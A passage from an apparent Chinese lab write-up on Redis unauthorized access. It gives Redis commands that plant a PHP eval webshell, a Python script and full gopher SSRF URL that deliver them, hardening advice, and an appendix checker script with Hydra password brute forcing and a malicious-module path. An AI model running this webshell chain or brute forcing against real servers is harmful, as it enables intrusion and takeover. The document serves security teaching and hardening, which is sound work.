+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">flushall</span><br><span class="language-xml">set 1 &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>\[\\<span class="hljs-string">&quot;f4ke\\&quot;</span>\]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;</span><br><span class="language-xml">config set dir /var/www/html</span><br><span class="language-xml">config set dbfilename 5he1l.php</span><br><span class="language-xml">save</span><br><span class="language-xml">quit</span><br></code></pre></td></tr></table></figure>
+
+<p>根据 RESP 协议使用python 脚本<code>redisSsrf.py</code>，将上述命令转换为 gopher payload。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><br>protocol = <span class="hljs-string">&quot;gopher://&quot;</span><br>ip = <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>port = <span class="hljs-string">&quot;6379&quot;</span><br>shell = <span class="hljs-string">&quot;\\n\\n&lt;?php eval($_POST\[\\&quot;</span>f4ke\\<span class="hljs-string">&quot;\]);?&gt;\\n\\n&quot;</span><br>filename = <span class="hljs-string">&quot;5he1l.php&quot;</span><br>path = <span class="hljs-string">&quot;/var/www/html&quot;</span><br>passwd = <span class="hljs-string">&quot;&quot;</span><br>cmd = [<span class="hljs-string">&quot;flushall&quot;</span>,<br>     <span class="hljs-string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(shell.replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>)),  <br>     <span class="hljs-string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(path),<br>     <span class="hljs-string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(filename),<br>     <span class="hljs-string">&quot;save&quot;</span>,<br>     <span class="hljs-string">&quot;quit&quot;</span><br>    ]<br><span class="hljs-keyword">if</span> passwd:<br>    cmd.insert(<span class="hljs-number">0</span>,<span class="hljs-string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(passwd))<br>payload = protocol + ip + <span class="hljs-string">&quot;:&quot;</span> + port + <span class="hljs-string">&quot;/_&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">redis_format</span>(<span class="hljs-params">arr</span>):<br>    CRLF = <span class="hljs-string">&quot;\\r\\n&quot;</span><br>    redis_arr = arr.split(<span class="hljs-string">&quot; &quot;</span>)<br>    cmd = <span class="hljs-string">&quot;&quot;</span><br>    cmd += <span class="hljs-string">&quot;*&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(redis_arr))<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> redis_arr:<br>        cmd += CRLF + <span class="hljs-string">&quot;$&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>((x.replace(<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="hljs-string">&quot; &quot;</span>)))) + CRLF + x.replace(<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="hljs-string">&quot; &quot;</span>)<br>    cmd += CRLF<br>    <span class="hljs-keyword">return</span> cmd<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> cmd:<br>        payload += urllib.parse.quote(redis_format(x))<br><br>    <span class="hljs-comment"># print(payload)</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;http://192.168.198.147/ssrf.php?url=&quot;</span>+urllib.parse.quote(payload))<br><br></code></pre></td></tr></table></figure>
+
+<p>生成 payload</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">192.168.198.147</span>/ssrf.php?url=gopher%<span class="hljs-number">3</span>A//<span class="hljs-number">127.0.0.1</span>%<span class="hljs-number">3</span>A6379/_%<span class="hljs-number">252</span>A1%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25248</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aflushall%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252</span>A3%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25243</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aset%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25241</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A1%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252433</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">250</span>A%<span class="hljs-number">250</span>A%<span class="hljs-number">253</span>C%<span class="hljs-number">253</span>Fphp%<span class="hljs-number">2520</span>eval%<span class="hljs-number">2528</span>%<span class="hljs-number">2524</span>_POST%<span class="hljs-number">255</span>B%<span class="hljs-number">2522</span>f4ke%<span class="hljs-number">2522</span>%<span class="hljs-number">255</span>D%<span class="hljs-number">2529</span>%<span class="hljs-number">253</span>B%<span class="hljs-number">253</span>F%<span class="hljs-number">253</span>E%<span class="hljs-number">250</span>A%<span class="hljs-number">250</span>A%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252</span>A4%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25246</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aconfig%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25243</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aset%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25243</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Adir%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252413</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A/var/www/html%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252</span>A4%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25246</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aconfig%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25243</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aset%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252410</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Adbfilename%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25249</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A5he1l.php%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252</span>A1%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25244</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Asave%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252</span>A1%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25244</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aquit%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A<br></code></pre></td></tr></table></figure>
+
+<p>使用curl 访问构造好的 url ， 成功执行 Redis 命令写入 webshell</p>
+<p><img src="/img/courseimage-20240512212439121.png" srcset="/img/loading.gif" lazyload alt="image-20240512212439121"></p>
+<p>使用蚁剑尝试连接，连接成功</p>
+<p><img src="/img/courseimage-20240512212826275.png" srcset="/img/loading.gif" lazyload alt="image-20240512212826275"></p>
+<p>为了修复Redis未授权访问漏洞，可以采取以下措施：</p>
+<ol>
+<li><strong>设置密码认证</strong>：在Redis配置文件中启用<code>requirepass</code>选项，并设置一个强密码。</li>
+<li><strong>限制访问</strong>：修改<code>bind</code>配置，只允许信任的IP地址访问Redis服务。</li>
+<li><strong>使用安全通信</strong>：通过SSL&#x2F;TLS加密Redis客户端和服务器之间的通信。</li>
+<li><strong>监控和日志记录</strong>：开启Redis的日志记录功能，监控可疑的访问和操作。</li>
+<li><strong>及时更新</strong>：保持Redis版本更新，以修复已知的安全漏洞。</li>
+</ol>
+<h1 id="Redis-安全防护策略"><a href="#Redis-安全防护策略" class="headerlink" title="Redis 安全防护策略"></a>Redis 安全防护策略</h1><h2 id="1-配置访问控制策略"><a href="#1-配置访问控制策略" class="headerlink" title="1.配置访问控制策略"></a>1.配置访问控制策略</h2><h3 id="禁止监听在公网地址"><a href="#禁止监听在公网地址" class="headerlink" title="禁止监听在公网地址"></a>禁止监听在公网地址</h3><p>修改 Redis 监听端口，在配置文件 redis.conf 中进行设置，找到包含 bind 的行，将默认的<code>bind 0.0.0.0</code>改为<code>bind 127.0.0.1</code>或者内网 IP网段，重启 Redis以使配置生效。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">bind</span> 192.168.1.100 10.0.0.1</span><br>bind 127.0.0.1 ::1<br></code></pre></td></tr></table></figure>
+
+<h3 id="使用防火墙"><a href="#使用防火墙" class="headerlink" title="使用防火墙"></a>使用防火墙</h3><p>在服务器上配置防火墙，仅允许特定规则的Redis连接请求通过。阻止其他不必要的连接请求，降低安全风险。</p>
+<h2 id="2-修改默认配置"><a href="#2-修改默认配置" class="headerlink" title="2.修改默认配置"></a>2.修改默认配置</h2><h3 id="更改默认端口"><a href="#更改默认端口" class="headerlink" title="更改默认端口"></a>更改默认端口</h3><p>Redis 默认监听的端口为 6379，可以将配置文件的port项修改为其他非常用端口以隐藏服务</p>
+<h3 id="开启-Redis-安全认证并设置复杂的密码"><a href="#开启-Redis-安全认证并设置复杂的密码" class="headerlink" title="开启 Redis 安全认证并设置复杂的密码"></a>开启 Redis 安全认证并设置复杂的密码</h3><p>Redis默认配置是无密码的，故容易导致Redis的未授权访问。在 redis.conf 配置文件中，修改 requirepass 选项开启密码认证并设置强密码。</p>
+<h3 id="开启保护模式"><a href="#开启保护模式" class="headerlink" title="开启保护模式"></a>开启保护模式</h3><p>Redis在3.2版本新增了安全配置项protected-mode，开启后要求需要配置bind项并设置访问密码，关闭后允许远程连接。在 redis.conf 配置文件中，修改 protected-mode yes 选项开启保护模式，只允许有授权的主机远程访问。</p>
+<h2 id="3-禁止使用-Root-权限启动"><a href="#3-禁止使用-Root-权限启动" class="headerlink" title="3.禁止使用 Root 权限启动"></a>3.禁止使用 Root 权限启动</h2><h3 id="创建单独的用户用于启动redis"><a href="#创建单独的用户用于启动redis" class="headerlink" title="创建单独的用户用于启动redis"></a>创建单独的用户用于启动redis</h3><p>使用root权限启动redis有较多风险。可以创建的一个Redis用户只用于运行 Redis 服务，而无法登录。同时redis用户没有其他目录与文件的访问权限，在未授权访问发生时，攻击者也难以通过Redis入侵服务器上的其他服务。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">useradd -s /sbin/nolog -M redis <br>sudo -u redis redis-server /&lt;filepath&gt;/redis.conf <br></code></pre></td></tr></table></figure>
+
+<h3 id="设置文件的访问权限"><a href="#设置文件的访问权限" class="headerlink" title="设置文件的访问权限"></a>设置文件的访问权限</h3><p>Redis 密码可明文存储在配置文件中，因此需要禁止非相关用对于配置文件的访问，设置 Redis 配置文件权限为 600，只有文件所有者拥有读和写权限：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">chmod 600 /&lt;filepath&gt;/redis.conf<br></code></pre></td></tr></table></figure>
+
+<h2 id="4-监控和日志分析"><a href="#4-监控和日志分析" class="headerlink" title="4.监控和日志分析"></a>4.监控和日志分析</h2><p>定期检查Redis的访问日志，分析异常行为，及时发现和响应安全威胁。在配置文件logfile项指定日志文件保存位置：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">logfile &quot;/var/log/redis.log&quot;<br></code></pre></td></tr></table></figure>
+
+<h2 id="5-及时更新版本"><a href="#5-及时更新版本" class="headerlink" title="5.及时更新版本"></a>5.及时更新版本</h2><p>检查Redis版本，及时应用安全补丁和更新，以修复已知的安全漏洞。</p>
+<p>通过上述措施，可以有效地减少Redis未授权访问漏洞的风险，保护服务器和数据的安全。</p>
+<h1 id="防御策略验证实验"><a href="#防御策略验证实验" class="headerlink" title="防御策略验证实验"></a>防御策略验证实验</h1><p>以下通过脚本（具体代码参见附录）对redis安全性进行检查：</p>
+<p>运行脚本，可以发现，未经安全配置的redis无法通过大多数安全检查</p>
+<p><img src="/img/courseimage-20240517233702181.png" srcset="/img/loading.gif" lazyload alt="image-20240517233702181"></p>
+<h2 id="配置防御策略"><a href="#配置防御策略" class="headerlink" title="配置防御策略"></a>配置防御策略</h2><p>1.创建单独用户用于启动redis</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">创建的 Redis 用户只能用于运行 Redis 服务，而无法登录</span><br>useradd -s /sbin/nologin -m redis  <br><span class="hljs-meta prompt_"># </span><span class="language-bash">以redis用户启动redis</span><br>sudo -u redis nohup ./bin/redis-server ./redis.conf &amp;<br></code></pre></td></tr></table></figure>
+
+<p>2.修改配置文件，设置强密码，开启protected-mode，禁止或者重命名一些高危命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">编辑redis配置文件</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">设置强密码</span><br>requirepass strong_password<br><span class="hljs-meta prompt_"># </span><span class="language-bash">开启保护模式</span><br>protected-mode yes<br><span class="hljs-meta prompt_"># </span><span class="language-bash">1. 禁用高危命令：</span><br>rename-command FLUSHALL &quot;&quot;<br>rename-command CONFIG &quot;&quot;<br>rename-command EVAL &quot;&quot;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">2. 修改高危命令的名称：</span><br>rename-command FLUSHALL &quot;shuaxin&quot;<br>rename-command CONFIG &quot;peizhi&quot;<br>rename-command EVAL &quot;zhixing&quot;<br></code></pre></td></tr></table></figure>
+
+<p>3.配置访问控制，仅允许本地连接</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">允许局域网连接</span><br>bind 192.168.168.*<br><span class="hljs-meta prompt_"># </span><span class="language-bash">仅允许本地连接</span><br>bind 127.0.0.1 ::1<br></code></pre></td></tr></table></figure>
+
+<p>安全性验证</p>
+<p>使用脚本进行安全检查：</p>
+<p>由于使用了强密码，且配置了访问控制，故脚本连接时无法连接到redis。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 check_redis_security.py --host 192.168.198.147 --port 6379   <br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/courseimage-20240517154647351.png" srcset="/img/loading.gif" lazyload alt="image-20240517154647351"></p>
+<p>为了模拟密码泄露的情况，这里允许远程连接，password参数输入密码继续进行测试</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 check_redis_security.py --host 192.168.198.147 --port 6379  --password strong@pwd<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/courseInkedimage-20240517163331848.jpg" srcset="/img/loading.gif" lazyload alt="Inkedimage-20240517163331848"></p>
+<p>成功通过所有安全检查</p>
+<h2 id="Redis安全安装与配置"><a href="#Redis安全安装与配置" class="headerlink" title="Redis安全安装与配置"></a>Redis安全安装与配置</h2><p>根据Redis安全防护策略，编写自动化shell脚本安装Redis（具体代码参见附录）</p>
+<p>优点：</p>
+<p>1.设置密码，并检查密码强度</p>
+<p>2.默认开启访问控制策略，仅允许本地连接</p>
+<p>3.systemctl配置管理，便于维护与检查</p>
+<p>4.快速的自动化安装</p>
+<p>一键安装</p>
+<p><img src="/img/courseimage-20240518011538733.png" srcset="/img/loading.gif" lazyload alt="image-20240518011538733"></p>
+<p><img src="/img/courseimage-20240518011655104.png" srcset="/img/loading.gif" lazyload alt="image-20240518011655104"></p>
+<p>通过安全检测（由于访问控制策略，攻击主机无法连接）</p>
+<p><img src="/img/courseimage-20240518012412512.png" srcset="/img/loading.gif" lazyload alt="image-20240518012412512"></p>
+<p><img src="/img/courseimage-20240518012247382.png" srcset="/img/loading.gif" lazyload alt="image-20240518012247382"></p>
+<h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="安全性检测脚本"><a href="#安全性检测脚本" class="headerlink" title="安全性检测脚本"></a>安全性检测脚本</h2><p>check_redis_security.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> redis<br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> subprocess<br><br>exp_file = <span class="hljs-string">&quot;/home/kali/workfeild/exp.so&quot;</span>  <span class="hljs-comment"># 恶意模块路径</span><br>lhost = <span class="hljs-string">&quot;192.168.198.134&quot;</span>  <span class="hljs-comment"># 恶意服务器地址</span><br>password_file = <span class="hljs-string">&quot;/home/kali/password/top1000.txt&quot;</span>  <span class="hljs-comment"># 密码字典文件路径</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_redis_connection</span>(<span class="hljs-params">host, port, password</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    尝试连接到Redis服务器，如果连接成功返回True，否则返回False。</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        client = redis.StrictRedis(<br>            host=host, port=port, password=password, decode_responses=<span class="hljs-literal">True</span><br>        )<br>        client.ping()<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">except</span> redis.exceptions.ConnectionError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">except</span> redis.exceptions.AuthenticationError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[ERROR] Redis服务器需要身份验证&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_passwords</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    从 Hydra 输出文件中提取密码。</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    passwords = []<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;password:&quot;</span> <span class="hljs-keyword">in</span> line:<br>                password = line.split(<span class="hljs-string">&quot;password:&quot;</span>)[<span class="hljs-number">1</span>].strip()<br>                passwords.append(password)<br>    <span class="hljs-keyword">return</span> passwords<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">brute_force_redis_password</span>(<span class="hljs-params">host, password_file</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    使用Hydra进行Redis密码爆破。</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> password_file <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[ERROR] 未提供Hydra密码文件路径&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    command = [<br>        <span class="hljs-string">&quot;hydra&quot;</span>,<br>        host,<br>        <span class="hljs-string">&quot;redis&quot;</span>,<br>        <span class="hljs-string">&quot;-P&quot;</span>,<br>        password_file,<br>        <span class="hljs-string">&quot;-e&quot;</span>,<br>        <span class="hljs-string">&quot;ns&quot;</span>,<br>        <span class="hljs-string">&quot;-f&quot;</span>,<br>        <span class="hljs-string">&quot;-o&quot;</span>,<br>        <span class="hljs-string">&quot;redis.txt&quot;</span>,<br>    ]<br>    <span class="hljs-keyword">try</span>:<br>        subprocess.run(command, check=<span class="hljs-literal">True</span>)<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;redis.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>            lines = f.readlines()<br>            <span class="hljs-keyword">if</span> lines:<br>                <span class="hljs-keyword">pass</span><br>                <span class="hljs-comment"># print(&quot;[WARNING] Hydra密码破解成功！发现弱密码，请加强密码安全！&quot;)</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[INFO] Hydra密码破解未找到有效密码&quot;</span>)<br>    <span class="hljs-keyword">except</span> subprocess.CalledProcessError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[ERROR] 运行Hydra时出错: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title 